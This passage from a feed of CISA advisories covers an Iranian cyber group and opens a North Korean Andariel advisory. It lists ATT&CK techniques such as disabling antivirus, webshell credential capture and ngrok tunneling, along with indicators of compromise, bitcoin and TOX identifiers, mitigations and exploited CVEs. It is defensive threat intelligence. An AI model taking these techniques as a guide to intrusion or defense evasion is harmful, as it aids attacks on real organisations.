<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/001/\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a></td>
<td>Iranian cyber actors use administrator credentials to disable antivirus and security software.</td>
</tr>
<tr>
<td>Impair Defenses: Disable or Modify Tools</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/001/\" title=\"Impair Defenses: Disable or Modify Tools\">T1562.001</a></td>
<td>Iranian cyber actors attempt to enter security exemption tickets to the network security device or contractor to get their tools allowlisted.</td>
</tr>
<tr>
<td>Impair Defenses: Downgrade Attack</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1562/010/\" title=\"Impair Defenses: Downgrade Attack\">T1562.010</a></td>
<td>Iranian cyber actors lower PowerShell policies to a less secure level.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 6. Credential Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use or Assessed Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Input Capture</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1056/\" title=\"Input Capture\">T1056</a>&nbsp;</td>
<td>Iranian cyber actors capture login credentials on compromised Netscaler devices via a deployed webshell.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 7. Execution</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use or Assessed Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Command and Scripting</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting\">T1059.001</a></td>
<td>Iranian cyber actors use an admin account to initiate a remote desktop session to start Microsoft Windows PowerShell ISE.</td>
</tr>
<tr>
<td>Command and Scripting Interpreter</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter\">T1059.001</a></td>
<td>Iranian cyber actors enable servers to use Windows PowerShell Web Access.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 8. Discovery</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use or Assessed Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Query Registry</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1012/\" title=\"Query Registry\">T1012</a></td>
<td>Iranian cyber actors export registry hives and network firewall configurations.</td>
</tr>
<tr>
<td>Domain Trust Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1482/\" title=\"Domain Trust Discovery\">T1482</a></td>
<td>Iranian cyber actors exfiltrate account usernames from the domain controller and access configuration files and logs.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 9. Command and Control</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use or Assessed Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote Access Software</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1219/\">T1219</a></td>
<td>
<p>Iranian cyber actors install “AnyDesk” remote access program.</p>
<p>Iranian cyber actors deploy Meshcentral to connect with compromised servers for remote access.</p>
</td>
</tr>
<tr>
<td>Protocol Tunneling</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a></td>
<td>Iranian cyber actors use <code>ligolo / ligolo-ng</code> for open source tunneling and <code>ngrok[.]io</code> NGROK to create outbound connections to a random subdomain.</td>
</tr>
</tbody>
</table>
</div>
<div>
<h2><strong>Indicators of Compromise</strong></h2>
<h3>IP Address and Domain Identifiers</h3>
<p><strong>Disclaimer:</strong> The IP addresses and domains listed in <strong>Table 10</strong> were observed in use by the actors in the specified timeframes in 2024. The authoring agencies recommend organizations investigate or vet these IP addresses prior to taking action, such as blocking.</p>
<p><strong>Comment:&nbsp;</strong>In addition to the infrastructure provided in the table below, the FBI and CISA warn that these actors are known to leverage information obtained through intrusions into cloud-computing resources associated with victim organizations. The actors have used this cloud infrastructure to conduct further cyber operations targeting other organizations. The FBI observed use of this tradecraft against U.S. academic and defense sectors, but it could theoretically be used against any organization. The FBI and CISA warn that if these actors compromised your organization, they may be leveraging your cloud services accounts to conduct malicious cyber activity and target other victims. The FBI has observed instances of the actors using compromised cloud service accounts to transmit data stolen from other compromised organizations.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 10. Indicators of Compromise – Recent</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Indicator</th>
<th role=\"columnheader\">First Seen</th>
<th role=\"columnheader\">Most Recently Observed Date</th>
</tr>
</thead>
<tbody>
<tr>
<td>138.68.90[.]19</td>
<td>January 2024</td>
<td>August 2024</td>
</tr>
<tr>
<td>167.99.202[.]130</td>
<td>January 2024</td>
<td>August 2024</td>
</tr>
<tr>
<td>78.141.238[.]182</td>
<td>July 2024</td>
<td>August 2024</td>
</tr>
<tr>
<td>51.16.51[.]81</td>
<td>January 2024</td>
<td>August 2024</td>
</tr>
<tr>
<td>51.20.138[.]134</td>
<td>February 2024</td>
<td>August 2024</td>
</tr>
<tr>
<td>134.209.30[.]220</td>
<td>March 2024</td>
<td>August 2024</td>
</tr>
<tr>
<td>13.53.124[.]246</td>
<td>February 2024</td>
<td>August 2024</td>
</tr>
<tr>
<td>api.gupdate[.]net</td>
<td>September 2022</td>
<td>August 2024</td>
</tr>
<tr>
<td>githubapp[.]net</td>
<td>February 2024</td>
<td>August 2024</td>
</tr>
</tbody>
</table>
<p><strong>Disclaimer:</strong> The infrastructure in <strong>Table 11</strong> reflects historical IP addresses and domains associated with these actors. This data is being provided for informational purposes and to enable better tracking and attribution of these actors. The FBI and CISA do not recommend blocking of the indicators in <strong>Table 11&nbsp;</strong>based solely on their inclusion in this CSA.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><a><em>Table&nbsp;</em></a><em>11. Indicators of Compromise – Historical</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Indicator</th>
<th role=\"columnheader\">First Seen</th>
<th role=\"columnheader\">Most Recently Observed Date</th>
</tr>
</thead>
<tbody>
<tr>
<td>18.134.0[.]66</td>
<td>September 2023</td>
<td>November 2023</td>
</tr>
<tr>
<td>193.149.190[.]248</td>
<td>September 2023</td>
<td>January 2024</td>
</tr>
<tr>
<td>45.76.65[.]42</td>
<td>September 2023</td>
<td>December 2023</td>
</tr>
<tr>
<td>206.71.148[.]78</td>
<td>October 2023</td>
<td>January 2024</td>
</tr>
<tr>
<td>193.149.187[.]41</td>
<td>October 2023</td>
<td>November 2023</td>
</tr>
<tr>
<td>login.forticloud[.]online</td>
<td>October 2023</td>
<td>November 2023</td>
</tr>
<tr>
<td>fortigate.forticloud.[]online</td>
<td>October 2023</td>
<td>November 2023</td>
</tr>
<tr>
<td>cloud.sophos[.]one</td>
<td>October 2023</td>
<td>November 2023</td>
</tr>
</tbody>
</table>
</div>
<h3>Actor Identifiers</h3>
<p><strong>Disclaimer:</strong> The FBI observed the following identifiers associated with the Iranian cyber group and their ransomware affiliates. The FBI is providing this information to enable improved threat actor identification and tracking of malicious cyber activity. Please see <strong>Appendix A</strong> for list of TOX identifiers.</p>
<p>The FBI observed the threat actors to be associated with the following bitcoin address values:</p>
<ul>
<li><code>bc1q8n7jjgdepuym825zwwftr3qpem3tnjx3m50ku0</code></li>
<li><code>bc1qlwd94gf5uhdpu4gynk6znc5j3rwk9s53c0dhjs</code></li>
<li><code>bc1q2egjjzmchtm3q3h3een37zsvpph86hwgq4xskh</code></li>
<li><code>bc1qjzw7sh3pd5msgehdaurzv04pm40hm9ajpwjqky</code></li>
<li><code>bc1qn5tla384qxpl6zt7kd068hvl7y4a6rt684ufqp</code></li>
<li><code>bc1ql837eewad47zn0uzzjfgqjhsnf2yhkyxvxyjjc</code></li>
<li><code>bc1qy8pnttrfmyu4l3qcy59gmllzqq66gmr446ppcr</code></li>
<li><code>bc1q6620fmev7cvkfu82z43vwjtec6mzgcp5hjrdne</code></li>
<li><code>bc1qr6h2zcxlntpcjystxdf7qy2755p25yrwucm4lq</code></li>
<li><code>bc1qx9tteqhama2x2w9vwqsyny6hldh8my8udx5jlm</code></li>
<li><code>bc1qz75atxj4dvgezyuspw8yz9khtkuk5jpdgfauq8</code></li>
<li><code>bc1q6w2an66vrje747scecrgzucw9ksha66x9zt980</code></li>
<li><code>bc1qsn4l6h3mhyhmr72vw4ajxf2gr74hwpalks2tp9</code></li>
<li><code>bc1qtjhvqkun4uxtr4qmq6s3f7j49nr4sp0wywp489</code></li>
</ul>
<h2><strong>Mitigations</strong></h2>
<p>The FBI and CISA recommend all organizations implement the mitigations listed below to improve their cybersecurity posture based on the Iranian cyber group’s activity. The FBI judges the group’s targeting is primarily based on the identification of devices vulnerable to CVEs named in this notification (see <strong>Technical Details</strong> section for a list of CVEs). As such, any U.S. organization deploying software with these vulnerabilities may be targeted for further exploitation and should follow this guidance to defend against exploitation by this group.</p>
<p>These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s&nbsp;<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>
<p>The FBI and CISA recommend all organizations implement the following mitigations:</p>
<ul>
<li>Review available logs for IP addresses in <strong>Table 10</strong> for indications of traffic with your organization’s network in the provided timeframes [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DetectingRelevantThreatsandTTPs3A\" title=\"Detecting Relevant Threats and TTPs (3.A)\">CPG 3.A</a>]. The indicators in Table 11 should also be reviewed to identify historical activity or incidents which may have previously been identified by your organization.</li>
<li>Apply patches and/or mitigations for CVE-2024-3400, CVE-2022-1388, CVE-2019-19781, and CVE-2023-3519 [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#MitigatingKnownVulnerabilities1E\" title=\"Mitigating Known Vulnerabilities (1.E)\">CPG 1.E</a>].
<ul>
<li>Be advised, patching for the above referenced CVEs may be insufficient to mitigate malicious activity if your network has already been compromised by these actors while the network device was vulnerable. Additional investigation into the use of stolen credentials (e.g., via the webshell on Netscaler devices) is strongly encouraged to identify threat actor attempts to establish footholds on other parts of the network [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DetectingRelevantThreatsandTTPs3A\" title=\"Detecting Relevant Threats and TTPs (3.A)\">CPG 3.A</a>].</li>
</ul>
</li>
<li>Check your systems for the unique identifiers and TTPs used by the actors when operating on compromised networks, including creation of specific usernames, use of NGROK and Ligolo, and deployment of webshells in specific directories [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DetectingRelevantThreatsandTTPs3A\" title=\"Detecting Relevant Threats and TTPs (3.A)\">CPG 3.A</a>].</li>
<li>Check your systems for outbound web requests to <code>files.catbox[.]moe</code> and <code>***.ngrok[.]io</code> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DetectingRelevantThreatsandTTPs3A\" title=\"Detecting Relevant Threats and TTPs (3.A)\">CPG 3.A</a>].</li>
</ul>
<h2><strong>Validate Security Controls</strong></h2>
<p>In addition to applying mitigations, the FBI and CISA recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. The authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>
<p>To get started:</p>
<ol>
<li>Select an ATT&amp;CK technique described in this advisory (see <strong>Table 2</strong> to <strong>Table 10</strong>).</li>
<li>Align your security technologies against the technique.</li>
<li>Test your technologies against the technique.</li>
<li>Analyze your detection and prevention technologies’ performance.</li>
<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>
<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>
</ol>
<h2><strong>References</strong></h2>
<ol>
<li><a href=\"https://attack.mitre.org/versions/v15/groups/G0117/\" title=\"Fox Kitten\">Fox Kitten, UNC757, Parisite, Pioneer Kitten, RUBIDIUM, Lemon Sandstorm, Group G0117 | MITRE ATT&amp;CK®</a>&nbsp;</li>
<li><a href=\"https://www.crowdstrike.com/blog/who-is-pioneer-kitten/\" title=\"Who Is PIONEER KITTEN?\">PIONEER KITTEN: Targets &amp; Methods [Adversary Profile] (crowdstrike.com)</a></li>
<li><a href=\"https://www.sentinelone.com/anthology/noescape/\" title=\"NoEscape Ransomware: In-Depth Analysis, Detection, and Mitigation\">NoEscape - SentinelOne</a></li>
<li><a href=\"https://www.sentinelone.com/anthology/ransomhouse/\" title=\"RansomHouse Ransomware: In-Depth Analysis, Detection, and Mitigation\">RansomHouse - SentinelOne</a></li>
<li><a href=\"https://attack.mitre.org/versions/v15/software/S0556/\" title=\"Pay2Key\">Pay2Key, Software S0556 | MITRE ATT&amp;CK®</a></li>
<li><a href=\"https://research.checkpoint.com/2020/ransomware-alert-pay2key/\" title=\"Ransomware Alert: Pay2Key\">Pay2Key Ransomware Alert - Check Point Research</a></li>
</ol>
<h2><strong>Reporting</strong></h2>
<p>Your organization has no obligation to respond or provide information back to the FBI in response to this joint advisory. If, after reviewing the information provided, your organization decides to provide information to the FBI, reporting must be consistent with applicable state and federal laws.</p>
<h3>Ransomware Incidents</h3>
<p>The FBI and CISA are interested in any information that can be shared in the case of a ransomware incident, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with threat actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.</p>
<p>Additional details of interest include a targeted company point of contact, status and scope of infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial attack vector, and host- and network-based indicators.</p>
<p>The FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to the FBI’s <a href=\"https://www.ic3.gov/Home/ComplaintChoice\" title=\"Internet Crime Complain Center (IC3)\">Internet Crime Complain Center (IC3)</a>, your <a href=\"https://www.fbi.gov/contact-us/field-offices\" title=\"Field Offices\">local FBI Field Office</a>, or CISA via the agency’s <a href=\"https://www.cisa.gov/report\" title=\"Report to CISA\">Incident Reporting Form</a> or its 24/7 Operations Center (<a href=\"mailto:report@cisa.gov)\" title=\"Report to CISA\">report@cisa.gov</a>), or by calling 1-844-Say-CISA (1-844-729-2472).</p>
<h3>Other Incidents</h3>
<p>U.S. organizations are encouraged to report suspicious or criminal activity related to information in this advisory to the FBI’s <a href=\"https://www.ic3.gov/Home/ComplaintChoice\" title=\"Internet Crime Complain Center (IC3)\">Internet IC3</a> or your <a href=\"https://www.fbi.gov/contact-us/field-offices\" title=\"Field Offices\">local FBI Field Office</a>. Report suspicious or malicious cyber activity to CISA via the agency’s <a href=\"https://www.cisa.gov/report\" title=\"Report to CISA\">Incident Reporting Form</a> or its 24/7 Operations Center (<a href=\"mailto:report@cisa.gov\" title=\"Report to CISA\">report@cisa.gov</a>) or by calling 1-844-Say-CISA (1-844-729-2472). When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.</p>
<h2><strong>Disclaimer</strong></h2>
<p>The information in this report is being provided “as is” for informational purposes only. The FBI and CISA do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI and CISA.</p>
<h2><strong>Version History</strong></h2>
<p><strong>August 20, 2024:</strong> Initial version.</p>
<h2><strong>Appendix A: TOX Identifiers</strong></h2>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">TOX Identifier</th>
<th role=\"columnheader\">TOX Public Key</th>
<th role=\"columnheader\">Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>xplfinder</td>
<td>ea2ec0c3859d8d8c36d95a298beef6d7add17856655bfbea2554b8714f7c7c69</td>
<td>Iranian cyber group</td>
</tr>
<tr>
<td>Br0k3r</td>
<td>B761680E23F2EBB5F6887D315EBD05B2D7C365731E093B49ADB059C3DCCAA30C</td>
<td>Iranian cyber group</td>
</tr>
<tr>
<td>Access</td>
<td>185ADA4556737A4F26AE16F1A99CA82AB5684C32719EE426C420C0BC14384A0A</td>
<td>Ransomware affiliate</td>
</tr>
<tr>
<td>Admin ALPHV aka BlackCat</td>
<td>3488458145EB62D7D3947E3811234F4663D9B5AEEF6584AB08A2099A7F946664</td>
<td>Ransomware affiliate</td>
</tr>
<tr>
<td>Admin_NoEscape</td>
<td>0A6F992E1372DB4F245595424A7436EBB610775D6ADDC4D568ACC2AF5D315221</td>
<td>Ransomware affiliate</td>
</tr>
<tr>
<td>Americano_Sneeckers</td>
<td>14F8AD7D1553D1A47CF4C9E7BEDABCC5B759C86E54C636175A472C11D7DEC70F</td>
<td>Ransomware affiliate</td>
</tr>
<tr>
<td>Bettersock</td>
<td>2C76104C9AAAF32453A814C227E7D9D755451B551A3FD30D2EA332DF396B3A31</td>
<td>Ransomware affiliate</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
") (pubDate nil "Fri, 23 Aug 2024 12:41:53 EDT") (creator nil "CISA") (guid ((isPermaLink . "false")) "/node/22056")) (item nil (title nil "North Korea Cyber Group Conducts Global Espionage Campaign to Advance Regime’s Military and Nuclear Programs") (link nil "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a") (description nil "<h2><strong>Summary</strong></h2>
<p>The U.S. Federal Bureau of Investigation (FBI) and the following authoring partners are releasing this Cybersecurity Advisory to highlight cyber espionage activity associated with the Democratic People’s Republic of Korea (DPRK)’s Reconnaissance General Bureau (RGB) 3rd Bureau based in Pyongyang and Sinuiju:</p>
<ul>
<li>U.S. Cyber National Mission Force (CNMF)</li>
<li>U.S. Cybersecurity and Infrastructure Security Agency (CISA)</li>
<li>U.S. Department of Defense Cyber Crime Center (DC3)</li>
<li>U.S. National Security Agency (NSA)</li>
<li>Republic of Korea’s National Intelligence Service (NIS)</li>
<li>Republic of Korea’s National Police Agency (NPA)</li>
<li>United Kingdom’s National Cyber Security Centre (NCSC)</li>
</ul>
<p>The RGB 3<sup>rd</sup> Bureau includes a DPRK (aka North Korean) state-sponsored cyber group known publicly as <a href=\"https://www.mandiant.com/resources/blog/mapping-dprk-groups-to-government\" title=\"Not So Lazarus: Mapping DPRK Cyber Threat Groups to Government Organizations\">Andariel</a>, <a href=\"https://learn.microsoft.com/en-us/microsoft-365/security/intelligence/microsoft-threat-actor-naming?view=o365-worldwide\" title=\"How Microsoft names threat actors\">Onyx Sleet</a> (formerly PLUTONIUM), DarkSeoul, Silent Chollima, and Stonefly/Clasiopa. The group primarily targets defense, aerospace, nuclear, and engineering entities to obtain sensitive and classified technical information and intellectual property to advance the regime’s military and nuclear programs and ambitions. The authoring agencies believe the group and the cyber techniques remain an ongoing threat to various industry sectors worldwide, including but not limited to entities in their respective countries, as well as in Japan and India. RGB 3<sup>rd</sup> Bureau actors fund their espionage activity through ransomware operations against U.S. healthcare entities.</p>
<p>The actors gain initial access through widespread exploitation of web servers through known vulnerabilities in software, such as Log4j, to deploy a web shell and gain access to sensitive information and applications for further exploitation. The actors then employ standard system discovery and enumeration techniques, establish persistence using Scheduled Tasks, and perform privilege escalation using common credential stealing tools such as Mimikatz. The actors deploy and leverage custom malware implants, remote access tools (RATs), and open source tooling for execution, lateral movement, and data exfiltration.&nbsp;</p>
<p>The actors also conduct phishing activity using malicious attachments, including Microsoft Windows Shortcut File (LNK) files or HTML Application (HTA) script files inside encrypted or unencrypted zip archives.</p>
<p>The authoring agencies encourage critical infrastructure organizations to apply patches for vulnerabilities in a timely manner, protect web servers from web shells, monitor endpoints for malicious activities, and strengthen authentication and remote access protections. While not exclusive, entities involved in or associated with the below industries and fields should remain vigilant in defending their networks from North Korea state-sponsored cyber operations:</p>
<p>For additional information on DPRK state-sponsored malicious cyber activity, see CISA’s <a href=\"https://www.cisa.gov/topics/cyber-threats-and-advisories/advanced-persistent-threats/north-korea\" title=\"North Korea Cyber Threat Overview and Advisories\">North Korea Cyber Threat Overview and Advisories</a> webpage.</p>
<p>Download the PDF version of this report:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-08/aa24-207a-dprk-cyber-group-conducts-global-espionage-campaign_0.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-207A North Korea Cyber Group Conducts Global Espionage Campaign to Advance Regime’s Military and Nuclear Programs</a>
    <span class=\"c-file__size\">(PDF,       804.21 KB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-09/aa24-207a-dprk-cyber-group-conducts-global-espionage-campaign_ES.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-207A North Korea Cyber Group Conducts Global Espionage Campaign to Advance Regime’s Military and Nuclear Programs - Spanish Translation</a>
    <span class=\"c-file__size\">(PDF,       836.55 KB
  )</span>
  </div>
</div>
<p>For a downloadable copy of associated indicators of compromise (IOCs), see:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-07/AA24-207A.stix_.xml\" class=\"c-file__link\" target=\"_blank\">AA24-207A STIX XML</a>
    <span class=\"c-file__size\">(XML,       296.99 KB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-07/AA24-207A-North-Korea-Cyber-Group-Conducts-Global-Espionage-Campaign-to-Advance-Regimes-Military-and-Nuclear-Programs.stix_.json\" class=\"c-file__link\" target=\"_blank\">AA24-207A STIX JSON</a>
    <span class=\"c-file__size\">(JSON,       140.84 KB
  )</span>
  </div>
</div>
<h2><strong>Technical Details</strong></h2>
<h3>RGB 3<sup>rd</sup> Bureau</h3>
<p><a href=\"https://www.mandiant.com/resources/blog/mapping-dprk-groups-to-government\" title=\"Not So Lazarus: Mapping DPRK Cyber Threat Groups to Government Organizations\">Andariel</a> (also known as <a href=\"https://learn.microsoft.com/en-us/microsoft-365/security/intelligence/microsoft-threat-actor-naming?view=o365-worldwide\" title=\"How Microsoft names threat actors\">Onyx Sleet</a>, formerly PLUTONIUM, DarkSeoul, Silent Chollima, and Stonefly/Clasiopa) is a North Korean state-sponsored cyber group, under the RGB 3rd Bureau, based in Pyongyang and Sinuiju. The authoring agencies assess the group has evolved from conducting destructive attacks targeting U.S. and South Korean organizations to conducting specialized cyber espionage and ransomware operations.</p>
<h4><strong>Cyber Espionage</strong></h4>
<p>The actors currently target sensitive military information and intellectual property of defense, aerospace, nuclear, engineering organizations. To a lesser extent, the group targets medical and energy industries. See Table 1 for more victimology information.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 1. Andariel Cyber Espionage Victimology</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Industry&nbsp;</th>
<th role=\"columnheader\">Information Targeted</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Defense</strong></td>
<td>
<ul>
<li>Heavy and light tanks and self-propelled howitzers</li>
<li>Light strike vehicles and ammunition supply vehicles</li>
<li>Littoral combat ships and combatant craft</li>
<li>Submarines, torpedoes, unmanned underwater vehicles (UUVs), and autonomous underwater vehicles (AUVs)</li>
<li>Modeling and simulation services</li>
</ul>
</td>
</tr>
<tr>
<td><strong>Aerospace</strong></td>
<td>
<ul>
<li>Fighter aircraft and unmanned aerial vehicles (UAVs)</li>
<li>Missiles and missile defense systems</li>
<li>Satellites, satellite communications, and nano-satellite technology</li>
<li>Surveillance radar, phased-array radar, and other radar systems</li>
</ul>
</td>
</tr>
<tr>
<td><strong>Nuclear</strong></td>
<td>
<ul>
<li>Uranium processing and enrichment</li>
<li>Material waste and storage</li>
<li>Nuclear power plants</li>
<li>Government nuclear facilities and research institutes</li>
</ul>
</td>
</tr>
<tr>
<td><strong>Engineering</strong></td>
<td>
<ul>
<li>Shipbuilding and marine engineering</li>
<li>Robot machinery and mechanical arms</li>
<li>Additive manufacturing and 3D printing components and technology</li>
<li>Casting, fabrication, high-heat metal molding, and rubber and plastic molding</li>
<li>Machining processes and technology</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p>The information targeted—such as contract specifications, bills of materials, project details, design drawings, and engineering documents—has military and civilian applications and leads the authoring agencies to assess one of the group’s chief responsibilities as satisfying collection requirements for Pyongyang’s nuclear and defense programs.</p>
<h4><strong>Ransomware</strong></h4>
<p>Andariel actors fund their espionage activity through ransomware operations against U.S. healthcare entities, and in some instances, the authoring agencies have observed the actors launching ransomware attacks and conducting cyber espionage operations on the same day and/or leveraging ransomware and cyber espionage against the same entity. For more information on this ransomware activity, see joint advisories <a href=\"https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/3293960/us-south-korean-agencies-partner-to-stopransomware-threat-from-dprk/\" title=\"#StopRansomware: Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities\">#StopRansomware: Ransomware Attacks on Critical Infrastructure Fund DPRK Malicious Cyber Activities</a> and <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-187a\" title=\" North Korean State-Sponsored Cyber Actors Use Maui Ransomware to Target the Healthcare and Public Health Sector\">North Korean State-Sponsored Cyber Actors Use Maui Ransomware to Target the Healthcare and Public Health Sector</a>.</p>
<h3>Malicious Cyber Espionage Activity</h3>
<p>This advisory uses the <a href=\"https://attack.mitre.org/versions/v15/matrices/enterprise/\" title=\"Enterprise Matrix\">MITRE ATT&amp;CK for Enterprise</a> framework, version 15. See the Appendix: MITRE ATT&amp;CK Techniques for all referenced tactics and techniques.</p>
<h4><strong>Reconnaissance and Enumeration</strong></h4>
<p>While there is limited available information on the group’s initial reconnaissance methods, the actors likely identify vulnerable systems using publicly available internet scanning tools that reveal information such as vulnerabilities in public-facing web servers [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1595/\" title=\"Active Scanning\">T1595</a>, <a href=\"https://attack.mitre.org/versions/v15/techniques/T1592\" title=\"Gather Victim Host Information\">T1592</a>]. The actors gather open source information about their victims for use in targeting [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1591\" title=\"Gather Victim Org Information\">T1591</a>] and research Common Vulnerabilities and Exposures (CVEs) when published to the National Institute of Standards and Technology (NIST) National Vulnerability Database [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1596/\" title=\"Search Open Technical Databases\">T1596</a>]. CVEs researched include:</p>
<ul>
<li>CVE-2023-46604 – Apache ActiveMQ</li>
<li>CVE-2023-42793 – TeamCity&nbsp;</li>
<li>CVE-2023-3519 – Citrix NetScaler</li>
<li>CVE-2023-35078 – Ivanti Endpoint Manager Mobile (EPMM)&nbsp;</li>
<li>CVE-2023-34362 – MOVEIt&nbsp;</li>
<li>CVE-2023-33246 – RocketMQ&nbsp;</li>
<li>CVE-2023-32784 – KeePass&nbsp;</li>
<li>CVE-2023-32315 – Openfire&nbsp;</li>
<li>CVE-2023-3079 – Google Chromium V8 Type Confusion</li>
<li>CVE-2023-28771 and CVE-2023-33010 – Zyxell firmware</li>
<li>CVE-2023-2868 – Barracuda Email Security Gateway</li>
<li>CVE-2023-27997 – FortiGate SSL VPN&nbsp;</li>
<li>CVE-2023-25690 – Apache HTTP Server</li>
<li>CVE-2023-21932 – Oracle Hospitality Opera 5</li>
<li>CVE-2023-0669 – GoAnywhere MFT</li>
<li>CVE-2022-47966 – ManageEngine&nbsp;</li>
<li>CVE-2022-41352 and CVE-2022-27925 – Zimbra Collaboration Suite</li>
<li>CVE-2022-30190 – Microsoft Windows Support Diagnostic Tool</li>
<li>CVE-2022-25064 – TP-LINK<s>&nbsp;</s></li>
<li>CVE-2022-24990 and CVE-2021-45837 – TerraMaster NAS</li>
<li>CVE-2022-24785 – Moment.js&nbsp;</li>
<li>CVE-2022-24665, CVE-2022-24664, and CVE-2022-24663 – PHP Everywhere&nbsp;</li>
<li>CVE-2022-22965 – Spring4Shell</li>
<li>CVE-2022-22947 – Spring Cloud Gateway&nbsp;</li>
<li>CVE-2022-22005 – Microsoft SharePoint Server&nbsp;</li>
<li>CVE-2022-21882 – Win32k Elevation of Privilege&nbsp;</li>
